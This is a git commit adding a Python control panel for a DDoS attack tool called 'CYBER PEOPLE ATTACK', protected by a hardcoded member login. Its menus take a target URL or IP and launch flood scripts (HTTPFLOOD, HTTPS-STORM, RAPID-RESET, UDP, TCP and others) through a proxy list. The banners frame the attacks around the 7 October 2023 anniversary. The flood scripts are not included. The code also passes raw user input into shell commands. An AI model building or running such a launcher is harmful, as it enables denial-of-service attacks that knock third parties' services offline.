72815a03c256b9d3ceabaf33e2859da1abff5c11
Zeb4nk <zebanggarage20@gmail.com>
2024-10-03 18:35:28 +0700

    CPA3_1.py

---
+++ CPA3_1.py
@@ -0,0 +1,328 @@
+# FIXXED BY @Zeb4nk
+from operator import index
+import socket
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+from colorama import Fore, Back
+import os,sys,time,re,requests,json
+from requests import post
+import codecs
+import string
+import urllib
+import getpass
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+HALLO WELCOME MUJAHID''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+MOHON TUNGGU SEBENTAR...''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+LOADING⏳''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+SUCCES✅""")
+    time.sleep(0.8)
+    clear()
+
+def si():
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mCPA TEAM \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to MUJAHID TEAM DDOS \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Abdullah Al Asad \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v.03.1')
+    print("")
+
+def L4():
+	os.system ("clear")
+	print("""                          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+               \033[31m▒▒████████      \033[1;30m▒▒█████████      ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[1;30m▒▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██▒█████       ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[32m▒▒██             ▒▒██  ▒▒██
+               \033[31m▒▒████████      \033[32m▒▒███            ▒▒███  ▒▒██  \033[33mV.03.1
+           
+           \033[36m---------------⚔️⚔️ \033[32mCYBER PEOPLE ATTACK \033[36m⚔️⚔️---------------
+⠀⠀⠀
+
+\033[37m [ LAYER 4 ]
+\033[35m NOTE USE:
+TCP AWALAN IP PAKE http:// AKHIR /
+STRESS MODE : 
+ 1.TCP
+ 2.UDP
+ 3.HTTP
+METHODE  [IP] 
+
+\033[37m
+ – SAMP [IP] [PORT] [TIME] [THREAD]
+ – UDP [IP] [PORT] [TIME] [PACKET] [THREAD]
+ – TCP [IP] [PORT]
+ – STRESS [IP] [PORT] [MODE] [TIME]
+ 
+
+""")
+
+def L7():
+	os.system ("clear")
+	print("""                              ⠀⠀
+
+               \033[31m▒▒████████      \033[1;30m▒▒█████████      ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[1;30m▒▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██▒█████       ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[32m▒▒██             ▒▒██  ▒▒██
+               \033[31m▒▒████████      \033[32m▒▒███            ▒▒███  ▒▒██  \033[33mV.03.1
+           
+           \033[36m---------------⚔️⚔️ \033[32mCYBER PEOPLE ATTACK \033[36m⚔️⚔️---------------
+
+                      \033[37m [ LAYER 7 ]
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┣                  +  MODE = GET/POST  +
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┣~➤Methode input =>> HTTPS2 [url] [mode]
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┣~➤Methode input =>> HTTPFLOOD [url] [thread] [mode] [time]
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┣        CYBER PEOPLE ATTACK Indonesia for Palestine
+┣ Untuk Memperingati 1 tahun Badai Al Aqsa 7 oktober 2023
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+""")
+
+def MENU():
+    sys.stdout.write(f"         \x1b]2;Abdullah Al Asad --> Stars: [{bots}] | Online Users: [500] | Methods: [35] | Bypass: [29] | Amps: [14]\x07")
+    clear()
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mWelcome CPA Team \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233m Abdullah Al Asad \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @Zeb4nk \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate V.3.1')
+    print("")
+    print("""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀              \033[31m▒▒████████      \033[1;30m▒▒█████████      ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[1;30m▒▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██   ▒▒██      ▒▒██  ▒▒██
+             \033[31m▒▒██               ▒\033[37m▒██▒█████       ▒▒████████
+              \033[31m▒▒██     ▒▒█      \033[32m▒▒██             ▒▒██  ▒▒██
+               \033[31m▒▒████████      \033[32m▒▒███            ▒▒███  ▒▒██  \033[33mV.03.1
+           
+           \033[36m---------------⚔️⚔️ \033[32mCYBER PEOPLE ATTACK \033[36m⚔️⚔️---------------
+
+
+\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ==>> " MENU "
+""")
+
+def main():
+    MENU()
+    while(True):
+        cnc = input("root@CtiPannel:~# \x1b[1;37m\033[0m ")
+        if cnc == "L7" or cnc == "l4":
+            L7()
+        elif cnc == "L4" or cnc == "l4":
+             L4()
+
+# LAYER 7 METHODS
+                                  
+        elif "STRIKE" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                
+                os.system(f'cd godzilla && go run strike.go -url {url} GET')
+            except IndexError:
+                print('Usage: strike <url> <method> GET')
+                print('Example: strike https://example.com GET')
+
+        elif "TLZ" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                
+                os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
+            except IndexError:
+                print('Usage: TLZ <url> <method> GET')
+                print('Example: TLZ https://example.com')
+                
+                                   
+        elif "HTTPS-STORM" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                second = cnc.split()[4]
+                proxy = cnc.split()[5]
+                
+                os.system(f'cd godzilla && go run HTTPS-STORM.go {url} {thread} {method} {time} nil')
+            except IndexError:
+                print('Usage: HTTPS-STORM <url> <threads> <get/post> <seconds> <header.txt/nil')
+                print('Example: HTTPS-STORM https://example.com 500 <get/post> 125 <header.txt/nil')
+        
+        elif "BROWSER" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                second = cnc.split()[4]
+                proxy = cnc.split()[5]
+                os.system(f'cd godzilla && go run BROWSER.go {url} {thread} {method} {second} {proxy}')
+            except IndexError:
+                print('Usage: BROWSER <url> <threads> <get/post> <seconds> <header.txt/nil')
+                print('Example: BROWSER https://example.com 500 <get/post> 125 <header.txt/nil')
+                
+        elif "HTTPFLOOD" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                
+                os.system(f'cd godzilla && go run httpflood.go {url} {thread} {method} {time} nil')
+            except IndexError:
+                print('Usage: HTTPFLOOD <url> <threads> <get/post> <time>')
+                print('Example: HTTPFLOOD https://example.com 500 <get/post 125')
+              
+                        
+        elif "HTTP-RAND" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                
+                os.system(f'cd godzilla && node HTTP-RAND.js {url} {time}')
+            except IndexError:
+                print('Usage: HTTP-RAND <url> <time>')
+                print('Example: HTTP-RAND https://example.com 500')
+                
+                
+        elif "SAMP" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                thread = cnc.split()[4]
+                
+                os.system(f'cd godzilla && python3 samp.py -i {ip} -p {port} -t {time} -th {thread}')
+            except IndexError:
+                print('Usage: SAMP <ip> <port> <time> <thread>')
+                print('Example: SAMP 1.1.1 22 300 1250')
+                
+        elif "UDP" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                packet = cnc.split()[4]
+                thread = cnc.split()[5]
+                
+                os.system(f'cd godzilla && python3 UDP.py {ip} {port} {time} {packet} {thread}')
+            except IndexError:
+                print('Usage: UDP <ip> <port> <time> <packet> <thread>')
+                print('Example: UDP 1.1.1 22 300 50 1250')
+                
+        elif "TCP" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                
+                os.system(f'cd godzilla && node TCP.js {ip} {port} {time} {packet} {thread}')
+            except IndexError:
+                print('Usage: TCP <ip> <port>')
+                print('Example: TCP 1.1.1 22')
+                
+                
+        elif "HTTPS2" in cnc:
+            try:
+                url = cnc.split()[1]
+         
+                os.system(f'cd godzilla && go run Hulk.go -site {url} -data GET')
+                os.system(f'cd godzilla && go run strike.go -url [url] -method GET')
+                os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
+                os.system(f'cd godzilla && go run XCDDOS.go -site {url} -data GET')
+                os.system(f'cd godzilla && go run Low.go -site {url} -data GET')
+                os.system("clear")
+            except IndexError:
+                print('Usage: HTTPS2 <url> <method>')
+                print('Example: HTTPS2 https://example.com GET')
+                
+        elif "RAPID" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                
+                os.system(f'cd godzilla && go run RAPID-RESET.go -site {url} -data {method}')
+            except IndexError:
+                print('Usage: RAPID-RESET <url> <method>')
+                print('Example: RAPID-RESET https://example.com GET')
+                
+
+        elif "SOCKET" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                
+                os.system(f'cd godzilla && go run SOCKET.go -site {url} -data POST')
+            except IndexError:
+                print('Usage: SOCKET <url> <method>')
+                print('Example: SOCKET https://example.com')
+                
+
+        elif "MODULES-UPDATE" in cnc:
+            try:
+                os.system(f'cd godzilla && node node_auto_install_modules.js HTTP-NIGGA.js 404.js anus.js MIX.js BYPASS.js')
+            except IndexError:
+                print('Usage: MODULES-UPDATE')
+                print('Example: MODULES-UPDATE')	    
+
+        elif "MENU" in cnc:
+            print(f''' 
+    ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ==>> " L7 -> LAYER 7 "
+            ''')
+
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    os.system("clear")
+    user = "mujahid"
+    passwd = "cpa"
+    username = input("""
+
+
+
+
+
+    
+                
+                           ⚔️⚔️⚔️ \33[0;32mLOGIN TO DDOS : """)
+    password = getpass.getpass(prompt="""                  
+                           ⚔️⚔️⚔️ \33[0;32mPASSWORDS     : """)
+    if username != user or password != passwd:
+        print("")
+        print(f"""        
+                            ☠️☠️☠️ \033[1;31;40mAnda bukan Member \033[32m--CPA--
+                               \033[33mSilahkan hubungi Owner""")
+        time.sleep(0.6)
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("""                                              
+                         ⚡ \33[0;32mWELLCOME MUJAHIDDIN""")
+        time.sleep(0.3)
+    MENU()
+    main()
+    
+
+login()
